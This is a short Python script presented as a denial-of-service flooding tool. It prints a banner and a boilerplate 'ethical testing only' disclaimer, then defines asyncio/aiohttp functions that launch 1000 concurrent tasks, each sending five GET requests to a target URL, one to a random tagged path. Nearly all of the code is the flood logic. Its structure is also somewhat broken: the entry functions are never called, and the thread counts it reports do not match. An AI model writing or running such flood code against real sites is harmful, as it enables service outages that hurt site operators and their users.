try:
    import pyfiglet
    from pyfiglet import Figlet
    import aiohttp
    import asyncio
    import random
except:
    import os
    os.system('pip3 install aiohttp')

def flood_attack(url):
    fonts = Figlet(font='slant')
    print(fonts.renderText('DoS Start'))
    print(f"""
[ TOOL USAGE WARNING ]
[+] This tool is designed for educational and ethical testing purposes only. The use of this tool to engage in any form of Denial of Service (DoS) attacks or any other unauthorized activities is strictly prohibited.
[+] DO NOT use this tool against systems or networks that you do not have explicit permission to test. Unauthorized use of this tool may result in legal consequences.
[+] By proceeding, you acknowledge that you are using this tool responsibly and in compliance with all applicable laws and regulations. Any misuse of this tool is at your own risk.
[+] If you are uncertain about the legality or appropriateness of using this tool in a particular context, seek advice from legal professionals or authorized system administrators.
[+] By using this tool, you agree to take full responsibility for your actions and any consequences that may arise.

[+] Starting Attack target {url}
[-] Threading Default : 5000
+-------------------------------------+
| URL : {url}
| Path : /dora+attacked+[random_number]
| Thread : 5000
+-------------------------------------+
""")
    
try:
    async def send(sessions, url):
        path = str(random.randint(10000, 99999))
        async with sessions.get(url + "//Dora+Attacked+DoS" + path) as packet:
            async with sessions.get(url) as pack:
                async with sessions.get(url) as pack2:
                    async with sessions.get(url) as pack3:
                        async with sessions.get(url) as pack4:
                            pass
    async def main(url):
        threading = 1000
        n = []
        async with aiohttp.ClientSession() as sessions:
            for packets in range(threading):
                t = asyncio.ensure_future(send(sessions, url))
                n.append(t)
            await asyncio.gather(*n)
except Exception as e:
    print(f"Server Not Connected, Error :", e)
    exit()